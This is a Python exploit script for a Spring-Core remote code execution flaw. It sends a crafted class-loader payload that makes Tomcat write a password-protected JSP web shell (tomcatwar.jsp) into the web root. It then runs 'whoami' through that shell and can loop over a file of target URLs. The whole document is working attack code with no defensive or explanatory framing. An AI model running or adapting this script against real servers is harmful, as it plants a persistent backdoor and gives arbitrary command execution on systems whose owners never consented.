#coding:utf-8

import requests
import argparse
from urllib.parse import urljoin
from urllib3.exceptions import InsecureRequestWarning

# https://stackoverflow.com/questions/15445981/how-do-i-disable-the-security-certificate-check-in-python-requests#answer-32282390
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def Exploit(url):
    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:

        go = requests.post(url,headers=headers, data=data, timeout=15, allow_redirects=False, verify=False)
        shellurl = urljoin(url, 'tomcatwar.jsp')
        shellgo = requests.get(f'{shellurl}?pwd=j&cmd=whoami', timeout=15, allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print(f"The vulnerability exists, the shell address is :{shellurl}?pwd=j&cmd=whoami")
            print(f"got response: {shellgo.text}")
        else:
            print(f"The vulnerability seems does not exists")
            print(f"got response: {shellgo.status_code} / {shellgo.text}")
    except Exception as e:
        print(e)
        pass



def main():
    parser = argparse.ArgumentParser(description='Spring-Core Rce.')
    parser.add_argument('--file', help='url file', required=False)
    parser.add_argument('--url', help='target url', required=False)
    args = parser.parse_args()
    if args.url:
        Exploit(args.url)
    if args.file:
        with open (args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)

if __name__ == '__main__':
    main()